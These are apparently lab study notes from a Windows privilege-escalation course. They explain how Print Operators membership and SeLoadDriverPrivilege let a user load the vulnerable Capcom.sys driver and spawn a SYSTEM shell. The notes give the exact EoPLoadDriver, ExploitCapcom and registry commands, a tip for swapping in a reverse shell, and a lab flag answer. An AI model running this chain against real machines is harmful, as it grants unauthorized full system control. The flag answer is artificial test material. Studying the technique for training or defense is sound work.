# Print Operators

## ID
706

## Module
Windows Privilege Escalation

## Kind
notes

## Title
Section 14 — Print Operators

## Description
Abuse Print Operators group membership and SeLoadDriverPrivilege to load the vulnerable Capcom.sys driver, then exploit it to execute shellcode as NT AUTHORITY\SYSTEM.

## Tags
print-operators, seloaddriverprivilege, capcom, driver-load, privilege-escalation, windows

## Commands
- `whoami /priv`
- `EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys`
- `ExploitCapcom.exe`
- `reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"`
- `reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1`
- `reg delete HKCU\System\CurrentControlSet\Capcom` (cleanup)

## What This Section Covers
Print Operators group grants SeLoadDriverPrivilege, which allows loading kernel drivers. The vulnerable Capcom.sys driver contains functionality that lets any user execute shellcode with SYSTEM privileges. By loading this driver and exploiting it with ExploitCapcom.exe, we escalate from Print Operators member to full SYSTEM access.

## Methodology
1. RDP in and open an **elevated** CMD (Run as administrator with your creds to bypass UAC).
2. Confirm `SeLoadDriverPrivilege` appears in `whoami /priv` (it will show as Disabled in the elevated prompt).
3. Use `EoPLoadDriver.exe` to enable the privilege, create the registry key, and load `Capcom.sys` in one step.
4. Run `ExploitCapcom.exe` to exploit the loaded driver — a SYSTEM shell spawns.
5. Read the flag or perform post-exploitation.
6. Clean up: `reg delete HKCU\System\CurrentControlSet\Capcom`.

## Multi-step Workflow
```
# Elevated CMD (Run as administrator)
cd C:\Tools
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

cd C:\Tools\ExploitCapcom
ExploitCapcom.exe
# SYSTEM shell spawns

type C:\Users\Administrator\Desktop\flag.txt

# Clean up
reg delete HKCU\System\CurrentControlSet\Capcom
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Flag on Administrator Desktop | Pr1nt_0p3rat0rs_ftw! | EoPLoadDriver → ExploitCapcom → SYSTEM shell → type flag |

## Key Takeaways
- Print Operators get SeLoadDriverPrivilege + local logon rights on DCs + shutdown rights — a very powerful group.
- `SeLoadDriverPrivilege` doesn't show in an unelevated prompt — you must bypass UAC or open an elevated CMD first.
- `EoPLoadDriver.exe` automates the manual steps (enable privilege, create registry key, call NTLoadDriver) into one command.
- The manual method involves: registry keys under `HKCU\System\CurrentControlSet\CAPCOM`, then `EnableSeLoadDriverPrivilege.exe` to enable and load.
- For non-GUI access, modify `ExploitCapcom.cpp` line 292 to point to a reverse shell binary instead of `cmd.exe`.
- **This technique does NOT work on Windows 10 version 1803+** — HKCU registry references for drivers are blocked.

## Gotchas
- Must run from an **elevated** CMD or the privilege won't appear and nothing works — UAC blocks it.
- `ExploitCapcom.exe` is in a subdirectory `C:\Tools\ExploitCapcom\` — not directly in `C:\Tools\`.
- The `\??\` prefix in the ImagePath registry value is NT Object Path syntax — it's required, not a typo.
- On Win10 1803+, this entire attack chain is dead — SeLoadDriverPrivilege no longer allows HKCU driver references.
- Without GUI, you must recompile ExploitCapcom to launch a reverse shell instead of `cmd.exe`.
